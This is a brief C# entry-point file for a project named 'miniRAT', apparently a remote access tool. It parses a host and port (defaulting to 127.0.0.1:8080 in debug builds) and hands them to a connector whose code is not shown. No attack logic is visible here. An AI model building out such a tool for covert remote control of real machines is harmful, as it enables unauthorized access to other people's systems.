using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace miniRAT
{
    class Program
    {
        static void Main(string[] args)
        {
# if DEBUG
            if (args.Length == 0)
            {
                args = new string[] { "127.0.0.1", "8080" };
            }
#endif
            Start.Intro();
            if (Start.ParsInput(args) == false)
            {
                Console.WriteLine("Error in input args");
                Environment.Exit(0);
            }

            Connector.ConnectToServer(args);
        }
    }
}
